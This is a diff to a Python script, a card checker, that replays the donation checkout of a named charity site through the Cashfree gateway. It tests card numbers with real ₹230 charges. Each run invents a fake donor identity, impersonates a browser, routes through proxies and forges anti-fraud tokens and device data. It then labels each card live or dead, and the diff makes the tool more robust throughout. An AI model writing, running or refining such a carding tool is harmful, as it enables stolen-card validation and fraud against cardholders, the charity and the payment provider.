@@ -1,4 +1,3 @@
-
 """
 Cashfree card checker — beyondonor.com donation flow (fixed ₹230 Mosquito Net).
 
@@ -9,7 +8,7 @@ Flow replayed from HAR:
   4. gateway view -> transactionToken + transactionData
   5. direct charge -> result (txnStatus + message)
 
-Debit-only: credit cards are skipped (Cashfree mode = DEBIT_CARD).
+Debit-family only (debit + prepaid + unknown are allowed through; credit is skipped).
 Fresh identity + fresh session on every call (no reuse).
 """
 from __future__ import annotations
@@ -26,12 +25,10 @@ import uuid
 
 from curl_cffi.requests import AsyncSession
 
-# ── browser profile (same as Shopify/PayU) ────────────────────────────
+# ── browser profile (only profiles curl_cffi actually supports) ──────
 PROFILE_UA = {
     "chrome131": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "chrome136": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-    "chrome150": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
-    "firefox135": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
 }
 BROWSER_PROFILES = list(PROFILE_UA.keys())
 
@@ -45,7 +42,6 @@ LAST_NAMES = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'mille
               'martin', 'lee', 'white', 'harris', 'clark', 'lewis', 'robinson', 'walker',
               'young', 'allen', 'king', 'wright', 'scott', 'torres', 'nguyen', 'hill', 'flores']
 
-# ── billing address per BIN country (country code -> city/state/zip pool) ──
 COUNTRY_ADDRESSES = {
     "US": [("New York", "New York", "NY", "10080"), ("Los Angeles", "California", "CA", "90071"),
            ("Chicago", "Illinois", "IL", "60601"), ("Houston", "Texas", "TX", "77002")],
@@ -56,7 +52,6 @@ COUNTRY_ADDRESSES = {
     "AU": [("Sydney", "New South Wales", "NSW", "2000"), ("Melbourne", "Victoria", "VIC", "3000")],
 }
 
-# ── Cashfree endpoints ────────────────────────────────────────────────
 CAMPAIGN_SLUG = "protect-tribal-families-from-mosquitoes-mosquito-net-campaign-2026-2"
 CAMPAIGN_PAGE = f"https://www.beyondonor.com/campaigns/{CAMPAIGN_SLUG}"
 MERCHANT_CHECKOUT = "https://www.beyondonor.com/checkout"
@@ -82,7 +77,7 @@ def parse_card(cc: str):
 def generate_identity():
     first = random.choice(FIRST_NAMES).capitalize()
     last = random.choice(LAST_NAMES).capitalize()
-    phone = "9" + "".join(random.choice("0123456789") for _ in range(9))  # Indian mobile
+    phone = "9" + "".join(random.choice("0123456789") for _ in range(9))
     email = f"donor-{uuid.uuid4()}@beyondonor.com"
     return first, last, phone, email
 
@@ -124,7 +119,9 @@ def _device_data(device_id, ua, browser_name, browser_version, os_name, os_versi
 
 
 def _forter_token():
-    return f"{uuid.uuid4().hex[:24]}_{int(time.time()*1000)}__{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_', k=11))}__{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_', k=11))}"
+    return (f"{uuid.uuid4().hex[:24]}_{int(time.time()*1000)}__"
+            f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_', k=11))}__"
+            f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_', k=11))}")
 
 
 def _address_for_country(country_code):
@@ -136,7 +133,6 @@ def _address_for_country(country_code):
     }
 
 
-# ── result mapping ────────────────────────────────────────────────────
 CASHFREE_RESULT_MAP = {
     "SUCCESS": "ORDER_PAID",
     "insufficient funds": "INSUFFICIENT_FUNDS",
@@ -153,6 +149,12 @@ CASHFREE_RESULT_MAP = {
     "3ds": "3DS_REQUIRED",
     "authentication": "3DS_REQUIRED",
     "not supported": "NOT_SUPPORTED",
+    "invalid expiry": "EXPIRE_CARD",
+    "invalid month": "EXPIRE_CARD",
+    "invalid year": "EXPIRE_CARD",
+    "invalid cvv": "INCORRECT_CVC",
+    "invalid pin": "INCORRECT_CVC",
+    "amount mismatch": "AMOUNT_MISMATCH",
 }
 
 
@@ -164,7 +166,9 @@ def map_result(txn_status: str, message: str):
     low = (message or "").lower()
     for key, code in CASHFREE_RESULT_MAP.items():
         if key in low:
-            return code, ("APPROVED" if code in ("INSUFFICIENT_FUNDS", "3DS_REQUIRED", "INCORRECT_CVC", "EXPIRE_CARD") else "DECLINED")
+            return code, ("APPROVED" if code in (
+                "INSUFFICIENT_FUNDS", "3DS_REQUIRED", "INCORRECT_CVC", "EXPIRE_CARD"
+            ) else "DECLINED")
     return "GENERIC_DECLINE", "DECLINED"
 
 
@@ -179,6 +183,20 @@ class CashfreeResult:
         self.gateway = "Cashfree"
 
 
+def _new_session(impersonate: str, proxy_url: str, headers: dict) -> AsyncSession:
+    """Create AsyncSession with impersonate fallback (curl_cffi-safe)."""
+    def _mk(imp):
+        sess = AsyncSession(impersonate=imp, timeout=30)
+        sess.headers.update(headers)
+        if proxy_url:
+            sess.proxies = {"http": proxy_url, "https": proxy_url}
+        return sess
+    try:
+        return _mk(impersonate)
+    except Exception:
+        return _mk("chrome131")
+
+
 async def run_cashfree_check(card_entry: str, proxy_url: str = "") -> CashfreeResult:
     number, month, year, cvv = parse_card(card_entry)
     first, last, phone, email = generate_identity()
@@ -187,43 +205,62 @@ async def run_cashfree_check(card_entry: str, proxy_url: str = "") -> CashfreeRe
     impersonate = random.choice(BROWSER_PROFILES)
     ua = PROFILE_UA[impersonate]
     browser_name = "MozillaFirefox" if "Firefox" in ua else "GoogleChrome"
-    browser_version = re.search(r"(?:Firefox|Chrome)/([\d.]+)", ua)
-    browser_version = browser_version.group(1) if browser_version else "156.0"
+    browser_version_m = re.search(r"(?:Firefox|Chrome)/([\d.]+)", ua)
+    browser_version = browser_version_m.group(1) if browser_version_m else "131.0"
     os_name = "Linux" if "Linux" in ua else ("Windows" if "Windows" in ua else "macOS")
     os_version = "Ubuntu" if "Ubuntu" in ua else "10"
     platform = "Linux x86_64" if "Linux" in ua else ("Win32" if "Windows" in ua else "MacIntel")
     device_id = _device_id()
 
-    headers = {
+    base_headers = {
         "User-Agent": ua,
         "Accept-Language": "en-US,en;q=0.9",
         "Accept-Encoding": "gzip, deflate, br",
         "Accept": "*/*",
     }
 
-    s = AsyncSession(impersonate=impersonate, timeout=30)
-    s.headers.update(headers)
-    if proxy_url:
-        s.proxies = {"http": proxy_url, "https": proxy_url}
+    s = _new_session(impersonate, proxy_url, base_headers)
 
     try:
-        # 1. fetch the checkout page JS to get the server-action ids
-        r = await s.get(MERCHANT_CHECKOUT, headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
-        checkout_html = r.text
-        m = MERCHANT_JS_RE.search(checkout_html)
+        # ═══ 1. merchant checkout page + server action ids (with retry) ═══
+        checkout_html = ""
+        m = None
+        for attempt in range(3):
+            try:
+                r = await s.get(MERCHANT_CHECKOUT, headers={
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+                })
+                checkout_html = r.text
+                m = MERCHANT_JS_RE.search(checkout_html)
+                if m:
+                    break
+            except Exception:
+                pass
+            await asyncio.sleep(1.5)
         if not m:
-            raise Exception("could not find checkout page JS chunk")
+            raise Exception("could not find checkout page JS chunk (3 tries)")
+
         js_url = "https://www.beyondonor.com" + m.group(0)
-        r = await s.get(js_url)
-        js = r.text
-        m_fetch = re.search(r'createServerReference\)\("([a-z0-9]+)",[^,]+,[^,]+,[^,]+,"fetchCampaignMetaAction"\)', js)
-        m_checkout = re.search(r'createServerReference\)\("([a-z0-9]+)",[^,]+,[^,]+,[^,]+,"checkoutAction"\)', js)
+        js = ""
+        m_fetch = m_checkout = None
+        for attempt in range(3):
+            try:
+                r = await s.get(js_url)
+                js = r.text
+                m_fetch = re.search(
+                    r'createServerReference\)\("([a-z0-9]+)",[^,]+,[^,]+,[^,]+,"fetchCampaignMetaAction"\)', js)
+                m_checkout = re.search(
+                    r'createServerReference\)\("([a-z0-9]+)",[^,]+,[^,]+,[^,]+,"checkoutAction"\)', js)
+                if m_fetch and m_checkout:
+                    break
+            except Exception:
+                pass
+            await asyncio.sleep(1.0)
         if not m_fetch or not m_checkout:
-            raise Exception("could not find server action ids in checkout JS")
-        fetch_action = m_fetch.group(1)
+            raise Exception("could not find server action ids in checkout JS (3 tries)")
         checkout_action = m_checkout.group(1)
 
-        # 2. fetch campaign meta (the campaign info)
+        # ═══ 2. campaign meta ═══
         campaign_id = ""
         campaign_title = ""
         campaign_slug = CAMPAIGN_SLUG
@@ -250,45 +287,70 @@ async def run_cashfree_check(card_entry: str, proxy_url: str = "") -> CashfreeRe
         if not campaign_id or not campaign_item_id:
             raise Exception("could not extract campaign info")
 
-        # 4. merchant checkout (Next.js server action) -> paymentSessionId
-        occasion = {"eventDate": False, "promotionName": False, "promotionPhoto": False, "wishText": False, "videoWishText": False}
+        # ═══ 3. merchant checkout (Next.js server action) -> paymentSessionId ═══
+        occasion = {
+            "eventDate": False, "promotionName": False, "promotionPhoto": False,
+            "wishText": False, "videoWishText": False,
+        }
         key = f"{campaign_id}-{campaign_item_id}-{int(time.time()*1000)}"
         order_body = json.dumps([{
-            "donor": {"donorName": full_name, "donorPhone": phone, "donorEmail": None, "donorAddress": None},
+            "donor": {"donorName": full_name, "donorPhone": phone,
+                      "donorEmail": None, "donorAddress": None},
             "lines": [{
-                "campaignId": campaign_id, "campaignTitle": campaign_title, "campaignSlug": campaign_slug,
-                "campaignItemId": campaign_item_id, "itemName": item_name, "quantity": 1,
-                "unitPrice": unit_price, "campaignType": "product", "occasionInputs": occasion,
-                "key": key, "eventDate": None, "promotionName": None, "wishText": None, "videoWishText": None,
-            }]
+                "campaignId": campaign_id, "campaignTitle": campaign_title,
+                "campaignSlug": campaign_slug, "campaignItemId": campaign_item_id,
+                "itemName": item_name, "quantity": 1, "unitPrice": unit_price,
+                "campaignType": "product", "occasionInputs": occasion, "key": key,
+                "eventDate": None, "promotionName": None, "wishText": None,
+                "videoWishText": None,
+            }],
         }])
-        router_tree = urllib.parse.quote(json.dumps(["",{"children":["(public)",{"children":["checkout",{"children":["__PAGE__",{},None,None]},None,None]},None,None]},None,None,True]).replace("None", "null"))
+        router_tree = urllib.parse.quote(json.dumps([
+            "", {"children": [
+                "(public)", {"children": [
+                    "checkout", {"children": ["__PAGE__", {}, None, None]}, None, None
+                ]}, None, None
+            ]}, None, None, True
+        ]).replace("None", "null"))
         r = await s.post(MERCHANT_CHECKOUT, data=order_body,
-                         headers={"next-action": checkout_action, "next-router-state-tree": router_tree,
-                                  "content-type": "text/plain;charset=UTF-8", "origin": "https://www.beyondonor.com",
-                                  "referer": MERCHANT_CHECKOUT, "accept": "text/x-component"})
+                         headers={
+                             "next-action": checkout_action,
+                             "next-router-state-tree": router_tree,
+                             "content-type": "text/plain;charset=UTF-8",
+                             "origin": "https://www.beyondonor.com",
+                             "referer": MERCHANT_CHECKOUT,
+                             "accept": "text/x-component",
+                         })
         if r.status_code != 200:
-            raise Exception(f"merchant checkout failed: HTTP {r.status_code}")
+            raise Exception(f"merchant checkout failed: HTTP {r.status_code} body={r.text[:300]}")
         m = re.search(r'"paymentSessionId":"([^"]+)"', r.text)
         if not m:
             raise Exception("no paymentSessionId in merchant checkout response")
         payment_session_id = m.group(1)
 
-        # 5. Cashfree session (redirect)
+        # ═══ 4. Cashfree session ═══
         browser_meta = base64.b64encode(json.dumps({"userAgent": ua}).encode()).decode()
         r = await s.post(CF_SESSION_URL, data={
-            "payment_session_id": payment_session_id, "x_request_id": "x_request_id_form_atom",
-            "form_id": "form_id_atom", "browser_meta": browser_meta,
-            "platform": f"jsxx-c-2026.10.05-x-d-m-156-l-Linux", "checkForPayFast": "false",
+            "payment_session_id": payment_session_id,
+            "x_request_id": "x_request_id_form_atom",
+            "form_id": "form_id_atom",
+            "browser_meta": browser_meta,
+            "platform": "jsxx-c-2026.10.05-x-d-m-156-l-Linux",
+            "checkForPayFast": "false",
             "time_spent_on_page": str(random.randint(20000, 40000)),
-        }, headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.beyondonor.com",
-                    "Referer": "https://www.beyondonor.com/"})
+        }, headers={
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://www.beyondonor.com",
+            "Referer": "https://www.beyondonor.com/",
+        })
         if r.status_code != 200:
-            raise Exception(f"cashfree session failed: HTTP {r.status_code}")
+            raise Exception(f"cashfree session failed: HTTP {r.status_code} body={r.text[:300]}")
 
-        # 5. eligibility (BIN -> country / scheme / type / DCC) — needs the session context
-        device_data = _device_data(device_id, ua, browser_name, browser_version, os_name, os_version, platform)
-        x_request_id = f"CH-{time.strftime('%Y%m%d-%H%M%S')}-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))}"
+        # ═══ 5. eligibility (BIN -> country / scheme / type) ═══
+        device_data = _device_data(device_id, ua, browser_name, browser_version,
+                                   os_name, os_version, platform)
+        x_request_id = (f"CH-{time.strftime('%Y%m%d-%H%M%S')}-"
+                        f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))}")
         elig_headers = {
             "Content-Type": "application/json", "Origin": CF_BASE,
             "Referer": f"{CF_BASE}/checkout/payment-method/card",
@@ -296,31 +358,54 @@ async def run_cashfree_check(card_entry: str, proxy_url: str = "") -> CashfreeRe
             "x-device-id": device_id, "x-device-data": device_data,
             "x-client-device": "desktop", "x-client-rendering-type": "web",
         }
-        elig = await s.post(CF_ELIG_URL, json={"payment_method_filter": {"card": {"cardIdentifierType": "PLAIN_CARD", "cardIdentifier": number}}},
-                            headers=elig_headers)
+        elig = await s.post(CF_ELIG_URL, json={
+            "payment_method_filter": {"card": {
+                "cardIdentifierType": "PLAIN_CARD", "cardIdentifier": number,
+            }}
+        }, headers=elig_headers)
+
+        # BIN rejected by Cashfree (RuPay, Amex, unsupported issuer) — NOT an error
+        if elig.status_code == 400:
+            try:
+                err_body = elig.text[:300]
+            except Exception:
+                err_body = ""
+            return CashfreeResult(
+                card_entry, "CARD_NOT_SUPPORTED", "DECLINED",
+                f"BIN_NOT_SUPPORTED: {err_body}", "230.00", "INR"
+            )
         if elig.status_code != 200:
-            raise Exception(f"eligibility failed: HTTP {elig.status_code}")
+            raise Exception(f"eligibility failed: HTTP {elig.status_code} body={elig.text[:300]}")
+
         elig_data = elig.json()
         bin_resp = elig_data.get("cardBinResponse") or {}
         card_type = (bin_resp.get("type") or "").lower()
         card_scheme = (bin_resp.get("scheme") or "unknown")
         card_country = (bin_resp.get("countryCode") or "US").upper()
 
-        # card not supported by Cashfree (empty BIN lookup / explicit error)
         if elig_data.get("errorMessagePresent") or (not card_type and not card_scheme):
-            return CashfreeResult(card_entry, "CARD_NOT_SUPPORTED", "DECLINED",
-                                  elig_data.get("errorMessage") or "CARD_NOT_SUPPORTED", "230.00", "INR")
+            return CashfreeResult(
+                card_entry, "CARD_NOT_SUPPORTED", "DECLINED",
+                elig_data.get("errorMessage") or "CARD_NOT_SUPPORTED", "230.00", "INR"
+            )
 
-        # debit-only
-        if card_type and card_type != "debit":
-            return CashfreeResult(card_entry, "CARD_TYPE_NOT_SUPPORTED", "DECLINED", "CREDIT_CARD_SKIPPED", "230.00", "INR")
+        # debit-family only (prepaid + unknown let through, credit skipped)
+        if card_type and card_type not in ("debit", "prepaid", "unknown"):
+            return CashfreeResult(
+                card_entry, "CARD_TYPE_NOT_SUPPORTED", "DECLINED",
+                f"{card_type.upper()}_SKIPPED", "230.00", "INR"
+            )
 
-        # 6. submit payment (card + billing address)
+        # ═══ 6. submit payment (with 502 retry, capture 400 body) ═══
         addr = _address_for_country(card_country)
-        device_data = _device_data(device_id, ua, browser_name, browser_version, os_name, os_version, platform)
+        device_data = _device_data(device_id, ua, browser_name, browser_version,
+                                   os_name, os_version, platform)
         forter = _forter_token()
-        risk_data = base64.b64encode(json.dumps({"card_number_input_type": "user pasted"}).encode()).decode()
-        x_request_id = f"CH-{time.strftime('%Y%m%d-%H%M%S')}-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))}"
+        risk_data = base64.b64encode(json.dumps({
+            "card_number_input_type": "user pasted"
+        }).encode()).decode()
+        x_request_id = (f"CH-{time.strftime('%Y%m%d-%H%M%S')}-"
+                        f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))}")
         payment_body = {
             "payment_method": {"card": {
                 "channel": "post", "card_number": number, "card_holder_name": full_name,
@@ -341,34 +426,71 @@ async def run_cashfree_check(card_entry: str, proxy_url: str = "") -> CashfreeRe
             "x-client-device": "desktop", "x-client-rendering-type": "web",
             "cookie": f"forterToken={forter}",
         }
-        r = await s.post(CF_PAYMENTS_URL, json=payment_body, headers=cf_headers)
-        if r.status_code != 200:
-            raise Exception(f"payment submit failed: HTTP {r.status_code}")
-        pay_data = r.json()
+
+        pay_resp = None
+        for attempt in range(3):
+            pay_resp = await s.post(CF_PAYMENTS_URL, json=payment_body, headers=cf_headers)
+            if pay_resp.status_code in (502, 503, 504):
+                await asyncio.sleep(2 + attempt * 2)
+                continue
+            break
+
+        if pay_resp is None or pay_resp.status_code != 200:
+            body_txt = ""
+            try:
+                body_txt = pay_resp.text[:800] if pay_resp is not None else ""
+            except Exception:
+                pass
+            sc = pay_resp.status_code if pay_resp is not None else 0
+            raise Exception(f"payment submit failed: HTTP {sc} body={body_txt}")
+
+        pay_data = pay_resp.json()
         gateway_url = (pay_data.get("data") or {}).get("url") or ""
         if not gateway_url:
-            raise Exception("no gateway url in payment response")
+            raise Exception(f"no gateway url in payment response: {json.dumps(pay_data)[:300]}")
 
-        # 7. gateway view -> transactionToken + transactionData
-        r = await s.get(gateway_url, headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Referer": f"{CF_BASE}/checkout/payment-method/card"})
+        # ═══ 7. gateway view -> transactionToken + transactionData ═══
+        r = await s.get(gateway_url, headers={
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Referer": f"{CF_BASE}/checkout/payment-method/card",
+        })
         ghtml = r.text
-        m_tok = re.search(r"id='txnToken'\s+value='([^']+)'", ghtml)
-        m_id = re.search(r"id='txnID'\s+value='([^']+)'", ghtml)
-        m_data = re.search(r"value='([A-Za-z0-9+/=]{200,})'>", ghtml)
+        m_tok = re.search(r"""id=['"]txnToken['"]\s+value=['"]([^'"]+)['"]""", ghtml)
+        m_id = re.search(r"""id=['"]txnID['"]\s+value=['"]([^'"]+)['"]""", ghtml)
+        m_data = re.search(r"""id=['"]txnData['"]\s+value=['"]([^'"]{200,})['"]""", ghtml)
+        if not m_data:
+            m_data = re.search(r"""value=['"]([A-Za-z0-9+/=]{200,})['"]""", ghtml)
         if not m_tok or not m_id or not m_data:
-            raise Exception("could not extract txn token/data from gateway view")
+            raise Exception(
+                f"could not extract txn token/data from gateway view "
+                f"(tok={bool(m_tok)} id={bool(m_id)} data={bool(m_data)} html_len={len(ghtml)})"
+            )
         txn_token = m_tok.group(1)
         txn_id = m_id.group(1)
         txn_data = m_data.group(1)
 
-        # 8. direct charge
-        r = await s.post(CF_DIRECT_CHARGE, json={"transactionToken": txn_token, "transactionId": txn_id, "transactionData": txn_data},
-                         headers={"Content-Type": "application/json", "Origin": CF_BASE, "Referer": CF_BASE + "/"})
+        # ═══ 8. direct charge (fix: message can be str OR dict) ═══
+        r = await s.post(CF_DIRECT_CHARGE, json={
+            "transactionToken": txn_token,
+            "transactionId": txn_id,
+            "transactionData": txn_data,
+        }, headers={
+            "Content-Type": "application/json",
+            "Origin": CF_BASE,
+            "Referer": CF_BASE + "/",
+        })
         if r.status_code != 200:
-            raise Exception(f"direct charge failed: HTTP {r.status_code}")
+            raise Exception(f"direct charge failed: HTTP {r.status_code} body={r.text[:400]}")
+
         dc = r.json()
-        msg = (dc.get("message") or {}).get("message") or ""
-        txn_status = (dc.get("message") or {}).get("txnStatus") or ""
+        msg_obj = dc.get("message")
+        if isinstance(msg_obj, dict):
+            msg = msg_obj.get("message") or ""
+            txn_status = msg_obj.get("txnStatus") or ""
+        else:
+            msg = str(msg_obj or "")
+            txn_status = ""
+
         code, label = map_result(txn_status, msg)
         real = f"{txn_status}: {msg}" if msg and txn_status else (txn_status or msg)
         return CashfreeResult(card_entry, code, label, real, "230.00", "INR")
